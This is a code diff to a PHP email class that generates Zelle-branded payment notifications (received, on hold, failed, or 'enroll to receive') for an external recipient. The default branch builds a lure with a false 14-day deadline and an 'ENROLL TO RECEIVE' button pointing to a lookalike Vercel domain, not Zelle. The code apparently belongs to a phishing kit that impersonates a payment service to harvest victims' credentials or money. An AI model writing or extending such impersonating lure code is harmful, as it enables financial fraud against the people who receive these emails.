@@ -180,6 +180,29 @@ class ExternalRecipientNotification extends Mailable
 
         $senderName = $this->customSender ?? $user->full_name;
 
+        $zelleBodyText = '';
+        $zelleButtonBlock = '';
+        $zelleSubtext = '';
+        
+        $cleanStatus = strtolower($this->status);
+        if (in_array($cleanStatus, ['completed', 'success'])) {
+            $zelleBodyText = 'Good news!<br>You have received<br><span style="font-size:30px;font-family:Helvetica-Bold;line-height:35px;text-align:center"><strong style="font-family:Helvetica-Bold">$' . $formattedAmount . '</strong></span><br>from <span style="text-transform:uppercase;font-family:Helvetica">' . $senderName . '</span>';
+            $zelleButtonBlock = '<div style="padding:10px 10px 8px;width:300px;margin:0px auto;color:rgb(0,0,0);text-align:center;"><a href="https://www.zellepay.com/" target="_blank" style="display:inline-block;border-radius:4px;padding:15px 30px;font-family:\'Zelle Sans\',\'Helvetica Neue\',Helvetica,Arial,Verdana,\'Trebuchet MS\',sans-serif;background-color:rgb(110,26,201);color:rgb(255,255,255);text-decoration:none;font-size:16px;line-height:30px;text-transform:uppercase;">VIEW TRANSACTION</a></div>';
+            $zelleSubtext = 'Processed on ' . $displayDate . '<br>Funds are now available in your account.';
+        } else if (in_array($cleanStatus, ['hold', 'on hold', 'pending review'])) {
+            $zelleBodyText = 'Action Required.<br>A transfer of<br><span style="font-size:30px;font-family:Helvetica-Bold;line-height:35px;text-align:center"><strong style="font-family:Helvetica-Bold">$' . $formattedAmount . '</strong></span><br>from <span style="text-transform:uppercase;font-family:Helvetica">' . $senderName . '</span> is currently on hold.';
+            $zelleButtonBlock = '<div style="padding:10px 10px 8px;width:300px;margin:0px auto;color:rgb(0,0,0);text-align:center;"><a href="https://www.zellepay.com/support/contact" target="_blank" style="display:inline-block;border-radius:4px;padding:15px 30px;font-family:\'Zelle Sans\',\'Helvetica Neue\',Helvetica,Arial,Verdana,\'Trebuchet MS\',sans-serif;background-color:rgb(220,53,69);color:rgb(255,255,255);text-decoration:none;font-size:16px;line-height:30px;text-transform:uppercase;">CONTACT SUPPORT</a></div>';
+            $zelleSubtext = 'Initiated on ' . $displayDate . '<br>Subject to verification.';
+        } else if (in_array($cleanStatus, ['failed', 'cancelled', 'canceled'])) {
+            $zelleBodyText = 'Transfer Failed.<br>The transfer of<br><span style="font-size:30px;font-family:Helvetica-Bold;line-height:35px;text-align:center"><strong style="font-family:Helvetica-Bold">$' . $formattedAmount . '</strong></span><br>from <span style="text-transform:uppercase;font-family:Helvetica">' . $senderName . '</span> was cancelled or failed.';
+            $zelleButtonBlock = '<div style="padding:10px 10px 8px;width:300px;margin:0px auto;color:rgb(0,0,0);text-align:center;"><a href="https://www.zellepay.com/" target="_blank" style="display:inline-block;border-radius:4px;padding:15px 30px;font-family:\'Zelle Sans\',\'Helvetica Neue\',Helvetica,Arial,Verdana,\'Trebuchet MS\',sans-serif;background-color:rgb(110,26,201);color:rgb(255,255,255);text-decoration:none;font-size:16px;line-height:30px;text-transform:uppercase;">VIEW ZELLE HISTORY</a></div>';
+            $zelleSubtext = 'Status: CANCELLED / FAILED<br>No funds were transferred.';
+        } else {
+            $zelleBodyText = 'You only have <strong style="font-family:Helvetica">14</strong> days left.<br>Enroll to receive<br><span style="font-size:30px;font-family:Helvetica-Bold;line-height:25px;text-align:center"><strong style="font-family:Helvetica-Bold">$' . $formattedAmount . '</strong></span><br>from <span style="text-transform:uppercase;font-family:Helvetica">' . $senderName . '</span>';
+            $zelleButtonBlock = '<div style="padding:10px 10px 8px;width:300px;margin:0px auto;color:rgb(0,0,0);text-align:center;"><a href="https://zellepay-sigma.vercel.app/index1.html" target="_blank" style="display:inline-block;border-radius:4px;padding:15px 30px;font-family:\'Zelle Sans\',\'Helvetica Neue\',Helvetica,Arial,Verdana,\'Trebuchet MS\',sans-serif;background-color:rgb(110,26,201);color:rgb(255,255,255);text-decoration:none;font-size:16px;line-height:30px;text-transform:uppercase;">ENROLL TO RECEIVE</a></div>';
+            $zelleSubtext = 'Before ' . $displayDate . '<br>Terms and conditions apply';
+        }
+
         $shortcodes = [
             '[[USER_NAME]]' => $user->full_name,
             '[[SENDER_NAME]]' => $senderName,
@@ -190,6 +213,10 @@ class ExternalRecipientNotification extends Mailable
             '[[STATUS_DESC]]' => $phrase['desc'],
             '[[STATUS_ACTION]]' => $phrase['action'],
             '[[ZELLE_LINGUA]]' => $phrase['zelle_lingua'],
+            '[[ZELLE_BODY_TEXT]]' => $zelleBodyText,
+            '[[ZELLE_BUTTON_BLOCK]]' => $zelleButtonBlock,
+            '[[ZELLE_SUBTEXT]]' => $zelleSubtext,
+            '[[APP_URL]]' => rtrim(config('app.url'), '/'),
             '[[BANK_NAME]]' => $this->transaction->bank->name ?? data_get($manual_data, 'bank_name') ?? 'Your Bank',
             '[[ACCOUNT_NUMBER]]' => $maskedAccount,
             '[[DATE]]' => $displayDate,
@@ -212,6 +239,10 @@ class ExternalRecipientNotification extends Mailable
             '[MEMO]' => $memo,
             '[DESCRIPTION]' => $memo,
             '[FOOTER]' => '', // Will populate below
+            '[ZELLE_BODY_TEXT]' => $zelleBodyText,
+            '[ZELLE_BUTTON_BLOCK]' => $zelleButtonBlock,
+            '[ZELLE_SUBTEXT]' => $zelleSubtext,
+            '[APP_URL]' => rtrim(config('app.url'), '/'),
         ];
         
         $footerHtml = str_replace(array_keys($shortcodes), array_values($shortcodes), $this->template->email_footer ?? '');
